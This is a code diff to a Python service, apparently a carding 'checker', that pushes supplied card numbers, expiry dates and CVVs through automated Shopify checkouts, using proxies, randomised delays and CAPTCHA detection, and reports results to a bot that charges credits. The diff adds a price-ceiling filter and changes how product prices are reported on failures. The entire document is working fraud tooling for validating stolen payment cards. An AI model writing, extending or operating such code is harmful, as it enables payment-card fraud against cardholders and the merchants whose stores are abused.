@@ -166,7 +166,7 @@ async def make_graphql_request(session, graphql_url, params, headers, json_data,
     return None, "Request failed"
 
 
-async def fetch_products(domain, proxy_str=None):
+async def fetch_products(domain, proxy_str=None, max_price=None):
     try:
         if not domain.startswith("http"):
             domain = "https://" + domain
@@ -204,6 +204,9 @@ async def fetch_products(domain, proxy_str=None):
                         price = float(price.replace(",", ""))
                     else:
                         price = float(price)
+                    # Respect price ceiling when set by the bot's active filter
+                    if max_price is not None and price > max_price:
+                        continue
                     if price < min_price:
                         min_price = price
                         min_product = {
@@ -225,6 +228,10 @@ async def fetch_products(domain, proxy_str=None):
         final_product = preferred_product if preferred_product else min_product
         if isinstance(final_product, dict) and final_product.get("variant_id"):
             return final_product
+        # If max_price filter was applied, return a specific code so the bot can
+        # refund the credit and skip — otherwise fall through to generic error.
+        if max_price is not None:
+            return False, "NO_PRODUCT_IN_PRICE_RANGE"
         return False, "<b>No Valid Products</b>"
 
     except Exception as e:
@@ -265,7 +272,7 @@ def extract_clean_response(message):
     return message[:50]
 
 
-async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
+async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None, max_price=None):
     gateway = "UNKNOWN"
     total_price = "0.00"
     # product_price is set once after fetch_products and never overwritten by checkout
@@ -307,7 +314,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
         address2 = ""
 
         if not variant_id:
-            info = await fetch_products(ourl, proxy_str)
+            info = await fetch_products(ourl, proxy_str, max_price=max_price)
             if isinstance(info, tuple) and info[0] is False:
                 return False, info[1], gateway, product_price, currency
             variant_id = info["variant_id"]
@@ -348,7 +355,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 )
 
             if cart_resp.status_code != 200:
-                return False, f"Cart failed with status {cart_resp.status_code}", gateway, total_price, currency
+                return False, f"Cart failed with status {cart_resp.status_code}", gateway, product_price if product_price != "0.00" else total_price, currency
 
             await asyncio.sleep(random.uniform(0.5, 2.0))
 
@@ -393,7 +400,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 sst = extract_between(text, '"sessionToken":"', '"')
 
             if "login" in checkout_url.lower():
-                return False, "Site requires login!", gateway, total_price, currency
+                return False, "Site requires login!", gateway, product_price if product_price != "0.00" else total_price, currency
 
             queueToken = extract_between(text, "queueToken&quot;:&quot;", "&quot;") or extract_between(text, '"queueToken":"', '"')
             stableId   = extract_between(text, "stableId&quot;:&quot;",   "&quot;") or extract_between(text, '"stableId":"',   '"')
@@ -446,7 +453,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 ident_sig = ident_match.group(1)
 
             if not sst:
-                return False, "Failed to get session token", gateway, total_price, currency
+                return False, "Failed to get session token", gateway, product_price if product_price != "0.00" else total_price, currency
 
             headers.update({
                 "shopify-checkout-client": "checkout-web/1.0",
@@ -572,65 +579,65 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     await asyncio.sleep(3)
 
             if not response:
-                return False, f"Request failed: {resp_text}", gateway, total_price, currency
+                return False, f"Request failed: {resp_text}", gateway, product_price if product_price != "0.00" else total_price, currency
 
             if is_captcha_required(resp_text):
-                return False, "CAPTCHA_REQUIRED", gateway, total_price, currency
+                return False, "CAPTCHA_REQUIRED", gateway, product_price if product_price != "0.00" else total_price, currency
 
             try:
                 resp_json = json.loads(resp_text)
             except json.JSONDecodeError as e:
-                return False, f"Invalid JSON response: {str(e)}", gateway, total_price, currency
+                return False, f"Invalid JSON response: {str(e)}", gateway, product_price if product_price != "0.00" else total_price, currency
 
             if "errors" in resp_json:
                 errors = resp_json.get("errors", [])
                 error_msgs = [e.get("message", str(e)) for e in errors[:3]]
-                return False, f"GraphQL Error: {'; '.join(error_msgs)}", gateway, total_price, currency
+                return False, f"GraphQL Error: {'; '.join(error_msgs)}", gateway, product_price if product_price != "0.00" else total_price, currency
 
             try:
                 if "data" not in resp_json:
-                    return False, "No data in proposal response", gateway, total_price, currency
+                    return False, "No data in proposal response", gateway, product_price if product_price != "0.00" else total_price, currency
 
                 session_data = resp_json["data"].get("session")
                 if session_data is None:
-                    return False, "Session is null", gateway, total_price, currency
+                    return False, "Session is null", gateway, product_price if product_price != "0.00" else total_price, currency
 
                 negotiate = session_data.get("negotiate")
                 if negotiate is None:
-                    return False, "Negotiate returned null", gateway, total_price, currency
+                    return False, "Negotiate returned null", gateway, product_price if product_price != "0.00" else total_price, currency
 
                 result = negotiate.get("result")
                 if result is None:
-                    return False, "Result is null", gateway, total_price, currency
+                    return False, "Result is null", gateway, product_price if product_price != "0.00" else total_price, currency
 
                 result_type = result.get("__typename", "Unknown")
 
                 if result_type == "CheckpointDenied":
-                    return False, "Checkpoint Denied", gateway, total_price, currency
+                    return False, "Checkpoint Denied", gateway, product_price if product_price != "0.00" else total_price, currency
                 if result_type == "Throttled":
-                    return False, "Throttled", gateway, total_price, currency
+                    return False, "Throttled", gateway, product_price if product_price != "0.00" else total_price, currency
                 if result_type == "NegotiationResultFailed":
-                    return False, "Negotiation failed", gateway, total_price, currency
+                    return False, "Negotiation failed", gateway, product_price if product_price != "0.00" else total_price, currency
 
                 checkpoint_data = result.get("checkpointData")
 
                 seller_proposal = result.get("sellerProposal")
                 if seller_proposal is None:
-                    return False, "Seller proposal is null", gateway, total_price, currency
+                    return False, "Seller proposal is null", gateway, product_price if product_price != "0.00" else total_price, currency
 
                 delivery_data      = seller_proposal.get("delivery")
                 running_total_data = seller_proposal.get("runningTotal")
 
                 if not running_total_data:
-                    return False, "No runningTotal in sellerProposal", gateway, total_price, currency
+                    return False, "No runningTotal in sellerProposal", gateway, product_price if product_price != "0.00" else total_price, currency
 
                 running_total = running_total_data["value"]["amount"]
 
             except (KeyError, TypeError) as e:
-                return False, f"Failed to parse proposal response: {str(e)}", gateway, total_price, currency
+                return False, f"Failed to parse proposal response: {str(e)}", gateway, product_price if product_price != "0.00" else total_price, currency
 
             if not delivery_data:
-                return False, "No delivery data in proposal", gateway, total_price, currency
+                return False, "No delivery data in proposal", gateway, product_price if product_price != "0.00" else total_price, currency
 
             delivery_type = delivery_data.get("__typename", "")
 
@@ -702,7 +709,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                             break
 
             if not payment_identifier:
-                return False, "No valid payment method found", gateway, total_price, currency
+                return False, "No valid payment method found", gateway, product_price if product_price != "0.00" else total_price, currency
 
             json_data["query"] = QUERY_PROPOSAL_DELIVERY
             json_data["variables"]["delivery"]["deliveryLines"][0]["selectedDeliveryStrategy"] = {
@@ -737,7 +744,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             )
 
             if is_captcha_required(resp_text):
-                return False, "CAPTCHA_REQUIRED on delivery proposal", gateway, total_price, currency
+                return False, "CAPTCHA_REQUIRED on delivery proposal", gateway, product_price if product_price != "0.00" else total_price, currency
 
             payload = {
                 "credit_card": {
@@ -781,9 +788,9 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 token_data = json.loads(response.text)
                 token = token_data.get("id")
                 if not token:
-                    return False, "Unable to get payment token", gateway, total_price, currency
+                    return False, "Unable to get payment token", gateway, product_price if product_price != "0.00" else total_price, currency
             except Exception as e:
-                return False, f"Unable to get payment token: {str(e)}", gateway, total_price, currency
+                return False, f"Unable to get payment token: {str(e)}", gateway, product_price if product_price != "0.00" else total_price, currency
 
             params_submit = {"operationName": "SubmitForCompletion"}
 
@@ -922,12 +929,12 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             )
 
             if is_captcha_required(text):
-                return False, "CAPTCHA_REQUIRED on submit", gateway, total_price, currency
+                return False, "CAPTCHA_REQUIRED on submit", gateway, product_price if product_price != "0.00" else total_price, currency
 
             if "Your order total has changed." in text:
-                return False, "Site not supported", gateway, total_price, currency
+                return False, "Site not supported", gateway, product_price if product_price != "0.00" else total_price, currency
             if "The requested payment method is not available." in text:
-                return False, "Payment method not available", gateway, total_price, currency
+                return False, "Payment method not available", gateway, product_price if product_price != "0.00" else total_price, currency
 
             try:
                 resp_json   = json.loads(text)
@@ -939,8 +946,8 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         for error in errors:
                             code = error.get("code")
                             if code:
-                                return False, code, gateway, total_price, currency
-                    return False, "Empty submit response", gateway, total_price, currency
+                                return False, code, gateway, product_price if product_price != "0.00" else total_price, currency
+                    return False, "Empty submit response", gateway, product_price if product_price != "0.00" else total_price, currency
 
                 result_type = submit_data.get("__typename", "")
 
@@ -954,11 +961,11 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                             return True, "3DS_REQUIRED", gateway, total_price, currency
                         rid = receipt.get("id")
                     else:
-                        return False, "SubmitSuccess but no receipt", gateway, total_price, currency
+                        return False, "SubmitSuccess but no receipt", gateway, product_price if product_price != "0.00" else total_price, currency
 
                 elif result_type == "SubmitFailed":
                     reason = submit_data.get("reason", "Unknown reason")
-                    return False, extract_clean_response(reason), gateway, total_price, currency
+                    return False, extract_clean_response(reason), gateway, product_price if product_price != "0.00" else total_price, currency
 
                 elif result_type == "SubmitRejected":
                     errors = submit_data.get("errors", [])
@@ -970,26 +977,26 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                             if code in ("GENERIC_ERROR", "PAYMENT_FAILED", ""):
                                 detail = localized_msg or non_localized_msg
                                 if detail:
-                                    return False, detail, gateway, total_price, currency
+                                    return False, detail, gateway, product_price if product_price != "0.00" else total_price, currency
                             if code:
-                                return False, code, gateway, total_price, currency
-                    return False, "Submit Rejected", gateway, total_price, currency
+                                return False, code, gateway, product_price if product_price != "0.00" else total_price, currency
+                    return False, "Submit Rejected", gateway, product_price if product_price != "0.00" else total_price, currency
 
                 elif result_type == "Throttled":
-                    return False, "Throttled", gateway, total_price, currency
+                    return False, "Throttled", gateway, product_price if product_price != "0.00" else total_price, currency
 
                 receipt = submit_data.get("receipt", {})
                 if not receipt:
-                    return False, "No receipt in submit response", gateway, total_price, currency
+                    return False, "No receipt in submit response", gateway, product_price if product_price != "0.00" else total_price, currency
 
                 rid = receipt.get("id")
                 if not rid:
-                    return False, "No receipt ID", gateway, total_price, currency
+                    return False, "No receipt ID", gateway, product_price if product_price != "0.00" else total_price, currency
 
             except json.JSONDecodeError:
-                return False, f"Invalid JSON in submit response: {text[:100]}", gateway, total_price, currency
+                return False, f"Invalid JSON in submit response: {text[:100]}", gateway, product_price if product_price != "0.00" else total_price, currency
             except Exception as e:
-                return False, f"Error parsing submit: {str(e)}", gateway, total_price, currency
+                return False, f"Error parsing submit: {str(e)}", gateway, product_price if product_price != "0.00" else total_price, currency
 
             params_poll = {"operationName": "PollForReceipt"}
             poll_json_data = {
@@ -1048,7 +1055,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 return True, "CARD_DECLINED", gateway, total_price, currency
 
             if "WaitingReceipt" in final_text:
-                return False, "Change Proxy or Site", gateway, total_price, currency
+                return False, "Change Proxy or Site", gateway, product_price if product_price != "0.00" else total_price, currency
 
             try:
                 res_json = json.loads(final_text)
@@ -1077,7 +1084,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             elif "failedreceipt" in final_lower or "declined" in final_lower:
                 return True, code if code else "CARD_DECLINED", gateway, total_price, currency
             else:
-                return False, "Unknown Result", gateway, total_price, currency
+                return False, "Unknown Result", gateway, product_price if product_price != "0.00" else total_price, currency
 
     except Exception as e:
         return False, f"Error Processing Card: {str(e)}", gateway, product_price if product_price != "0.00" else total_price, currency
@@ -1095,8 +1102,8 @@ def parse_cc_string(cc_string):
     }
 
 
-async def process_card_async(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
-    result = await process_card(cc, mes, ano, cvv, site_url, variant_id, proxy_str)
+async def process_card_async(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None, max_price=None):
+    result = await process_card(cc, mes, ano, cvv, site_url, variant_id, proxy_str, max_price=max_price)
     # Normalize to always return exactly 5 values
     return result[:5]
 
@@ -1135,7 +1142,15 @@ async def product_price_endpoint():
     if not site:
         return jsonify({"error": "Missing 'site' parameter"}), 400
 
-    result = await fetch_products(site, proxy_str)
+    max_price = None
+    max_price_str = request.args.get("max_price")
+    if max_price_str:
+        try:
+            max_price = float(max_price_str)
+        except (ValueError, TypeError):
+            pass
+
+    result = await fetch_products(site, proxy_str, max_price=max_price)
     if isinstance(result, tuple) and result[0] is False:
         return jsonify({"error": str(result[1])}), 400
 
@@ -1174,9 +1189,29 @@ async def shopify_checker():
 
         variant_id = request.args.get("variant")
 
+        # Parse optional price ceiling from the bot's active filter
+        max_price = None
+        max_price_str = request.args.get("max_price")
+        if max_price_str:
+            try:
+                max_price = float(max_price_str)
+            except (ValueError, TypeError):
+                pass
+
         success, message, gateway, price, currency = await process_card_async(
-            cc, mes, ano, cvv, site, variant_id, proxy_str
+            cc, mes, ano, cvv, site, variant_id, proxy_str, max_price=max_price
         )
+
+        # Surface "NO_PRODUCT_IN_PRICE_RANGE" to the bot before map_response
+        # converts it to the generic "Dead" label.
+        if message and "NO_PRODUCT_IN_PRICE_RANGE" in str(message).upper():
+            return jsonify({
+                "Gateway":  DEFAULT_GATEWAY,
+                "Price":    0.0,
+                "Response": "NO_PRODUCT_IN_PRICE_RANGE",
+                "Status":   False,
+                "cc":       cc_string,
+            })
 
         clean_response = extract_clean_response(message)
         mapped_success, mapped_response = map_response(success, clean_response)
